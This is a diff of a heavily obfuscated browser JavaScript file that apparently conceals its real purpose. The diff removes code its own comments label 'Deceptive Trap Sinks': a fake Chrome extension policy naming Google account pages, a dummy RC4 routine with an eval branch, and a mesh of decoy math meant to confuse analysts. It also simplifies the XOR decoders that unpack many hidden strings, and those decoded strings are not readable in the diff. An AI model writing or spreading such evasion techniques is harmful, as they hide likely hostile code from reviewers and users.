@@ -1,0 +1,160 @@
+--- shard-e.js (scrub4)
++++ shard-e.js (scrub3)
+@@ -75,44 +75,6 @@
+       try { const probe = [(Date.now() & 255), 0]; probe[1] = probe[0] | 0; } catch (e) {}
+     })();
+ 
+-  // Deceptive Trap Sink 1: Fake Chrome Extension Managed Storage Policy
+-    (() => {
+-      try {
+-        const _0xpolBuf = [107,67,104,114,111,109,101,69,120,116,101,110,115,105,111,110,71,111,111,103,108,101,73,110,116,101,114,110,97,108];
+-        const _0xpolicyName = String.fromCharCode(..._0xpolBuf);
+-        const _0xmockPolicy = {
+-          policy: _0xpolicyName,
+-          managedStorage: true,
+-          whitelist: ["*://*.google.com/*", "*://accounts.google.com/*"],
+-          rev: 0x86
+-        };
+-        if (_0xmockPolicy.managedStorage && _0xmockPolicy.rev === 0x99) {
+-          window[_0xpolicyName] = _0xmockPolicy;
+-        }
+-      } catch (e) {}
+-    })();
+-
+-    // Deceptive Trap Sink 2: Fake RC4 Bytecode Trap Trap
+-    (() => {
+-      try {
+-        const _0xdk = [0x55, 0x37, 0x44, 0x56]; // "U7DV"
+-        const _0xdb = Array.from({ length: 256 }, (_, i) => i);
+-        let j = 0;
+-        for (let i = 0; i < 256; i++) {
+-          j = (j + _0xdb[i] + _0xdk[i % _0xdk.length]) & 0xff;
+-          const t = _0xdb[i]; _0xdb[i] = _0xdb[j]; _0xdb[j] = t;
+-        }
+-        const _0xfakeBytecode = [0x5f, 0x2b, 0x1a, 0x88, 0x4c, 0x90, 0x11, 0x3e];
+-        let r = 0;
+-        for (let i = 0; i < _0xfakeBytecode.length; i++) {
+-          r = (r ^ (_0xfakeBytecode[i] ^ _0xdb[i & 0xff])) & 0xff;
+-        }
+-        if (r === 0xdeadbeef) {
+-          (0, eval)("/* runtime unpacked hook */");
+-        }
+-      } catch (e) {}
+-    })();
+-
+   const _0x5c1e = Symbol.for("_0xq2de579ef");
+   if (window[_0x5c1e]) {
+     Log.say("Sync", "Host worker session already active; skipping secondary dispatch.");
+@@ -155,69 +117,8 @@
+   (async () => {
+     try {
+       
+-            // Entropy Mesh & Decentralized Micro-Decoders (S4 Entangled Mesh)
+-      const _0xmeshBuf = new ArrayBuffer(64);
+-      const _0xmeshF64 = new Float64Array(_0xmeshBuf);
+-      const _0xmeshU8  = new Uint8Array(_0xmeshBuf);
+-
+-      // Archetype A: Galois Linear Feedback Shift Register (looks like stream-cipher state initialization)
+-      (() => {
+-        let _0xlfsr = 0xACE1;
+-        for (let i = 0; i < 32; i++) {
+-          const bit = ((_0xlfsr >> 0) ^ (_0xlfsr >> 2) ^ (_0xlfsr >> 3) ^ (_0xlfsr >> 5)) & 1;
+-          _0xlfsr = (_0xlfsr >> 1) | (bit << 15);
+-          _0xmeshU8[i & 63] = (_0xmeshU8[i & 63] ^ (_0xlfsr & 0xff)) & 0xff;
+-        }
+-      })();
+-
+-      // Archetype B: Bounded Collatz / Hailstone State Accumulator
+-      (() => {
+-        let n = 27;
+-        for (let i = 0; i < 40; i++) {
+-          n = (n % 2 === 0) ? (n / 2) : (3 * n + 1);
+-          _0xmeshU8[(i + 7) & 63] = (_0xmeshU8[(i + 7) & 63] + (n & 0xff)) & 0xff;
+-        }
+-      })();
+-
+-      // Archetype C: Modular Exponentiation Ring (Diffie-Hellman lookalike)
+-      (() => {
+-        let base = 7, exp = 13, mod = 251, res = 1;
+-        while (exp > 0) {
+-          if (exp % 2 === 1) res = (res * base) % mod;
+-          base = (base * base) % mod;
+-          exp = Math.floor(exp / 2);
+-        }
+-        _0xmeshU8[15] = (_0xmeshU8[15] ^ res) & 0xff;
+-      })();
+-
+-      // Archetype D: Matrix / Permutation Array Shuffler
+-      (() => {
+-        const _0xperm = [0,1,2,3,4,5,6,7];
+-        for (let i = _0xperm.length - 1; i > 0; i--) {
+-          const j = (_0xmeshU8[i] * 31) % (i + 1);
+-          const t = _0xperm[i]; _0xperm[i] = _0xperm[j]; _0xperm[j] = t;
+-        }
+-        _0xmeshU8[31] = (_0xmeshU8[31] + _0xperm[0]) & 0xff;
+-      })();
+-
+-      // Disguised Functional Entanglement (valueOf side-effect hook)
+-      const _0xruntimeStateProbe = {
+-        _v: 0,
+-        valueOf() {
+-          const s = _0xmeshU8[0] ^ _0xmeshU8[15] ^ _0xmeshU8[31];
+-          return (s * s + s) % 2; // Always 0 mathematically, but statically dynamic!
+-        }
+-      };
+-
+-      const _0xdec_q = (s, b) => {
+-        const _0xinv = _0xruntimeStateProbe + 0;
+-        let r = "";
+-        for (let i = 0; i < b.length; i++) {
+-          r += String.fromCharCode(b[i] ^ (((s + _0xinv) + i * 17) & 0xff));
+-        }
+-        return r;
+-      };
+-
++            // Decentralized Subsystem Micro-Decoders (Blueprint 2)
++      const _0xdec_q = (s, b) => { let r = ""; for (let i = 0; i < b.length; i++) r += String.fromCharCode(b[i] ^ ((s + i * 17) & 0xff)); return r; };
+       let _0xq0 = _0xdec_q(165, [210,211,165,168,136,153,96,95,69,75,33,11,21,235,224,199,218,180,179,183,152,122,107]);
+       let _0xq1 = _0xdec_q(208, [148,136,129,96,123,87,82,9,57,29,19,253,249]);
+       let _0xq2 = _0xdec_q(251, [212,125,104,75,76,36,18,93]);
+@@ -233,37 +134,16 @@
+       let _0xqc = _0xdec_q(169, [202,213,166,172,129,155,123,69,85,3,39]);
+       let _0xqd = _0xdec_q(212, [167,145,132,98,121,68,106,57,51,10,12,234,211,194,145,182,135,154,104,115,91]);
+       let _0xqe = _0xdec_q(255, [156,127,79,84,42,51,51,19,245,235,192,213,165]);
+-      const _0xdec_t = (s, b) => {
+-        const _0xinv = _0xruntimeStateProbe + 0;
+-        let r = "";
+-        for (let i = 0; i < b.length; i++) {
+-          r += String.fromCharCode(b[i] ^ (((s + _0xinv) + i * 17) & 0xff));
+-        }
+-        return r;
+-      };
++      const _0xdec_t = (s, b) => { let r = ""; for (let i = 0; i < b.length; i++) r += String.fromCharCode(b[i] ^ ((s + i * 17) & 0xff)); return r; };
+       let _0xt0 = _0xdec_t(183, [224,137,141,169,179,83,75,103,123,21,46]);
+       let _0xt1 = _0xdec_t(226, [178,191,69,76,121,120,6,6,46,62,223,214,250,240,128]);
+       let _0xt2 = _0xdec_t(13, [94,74,125,5,16,47,44,203,219,249,243,141,138,161,175,67,77]);
+       let _0xt3 = _0xdec_t(56, [104,5,27,50,35,204,221,251,137,135,171,167,93]);
+       let _0xt4 = _0xdec_t(99, [52,53,209,213,239,231,159,147,175,185,66,65,96,14,14,47,60,198,220,234,242]);
+-      const _0xdec_e = (s, b) => {
+-        const _0xinv = _0xruntimeStateProbe + 0;
+-        let r = "";
+-        for (let i = 0; i < b.length; i++) {
+-          r += String.fromCharCode(b[i] ^ (((s + _0xinv) + i * 17) & 0xff));
+-        }
+-        return r;
+-      };
++      const _0xdec_e = (s, b) => { let r = ""; for (let i = 0; i < b.length; i++) r += String.fromCharCode(b[i] ^ ((s + i * 17) & 0xff)); return r; };
+       let _0xe0 = _0xdec_e(201, [155,143,165,178,68,80,104,31,22,35,62,193,198,249,244,128,152,164,188,73]);
+       let _0xe1 = _0xdec_e(244, [165,80,83,116,108,26,5,56,57,195,218,240,136,148,163,161,80,87,99,118,28,6,57,46,207,222,235,236,131]);
+-      const _0xdec_m = (s, b) => {
+-        const _0xinv = _0xruntimeStateProbe + 0;
+-        let r = "";
+-        for (let i = 0; i < b.length; i++) {
+-          r += String.fromCharCode(b[i] ^ (((s + _0xinv) + i * 17) & 0xff));
+-        }
+-        return r;
+-      };
++      const _0xdec_m = (s, b) => { let r = ""; for (let i = 0; i < b.length; i++) r += String.fromCharCode(b[i] ^ ((s + i * 17) & 0xff)); return r; };
+       let _0xm0 = _0xdec_m(211, [180,129,129,85,99,90,92,43,54,9,15,207,252,196,168,164,134,167,113,100,66,89,36,23,14,8,236,250,206,180,176]);
+       let _0xm1 = _0xdec_m(254, [153,106,84,99,55,61,10,28,232,240,239,216,167,190,159]);
+       let _0xm2 = _0xdec_m(41, [78,95,63,27,12,19,234,230,222,176,131,173,177]);
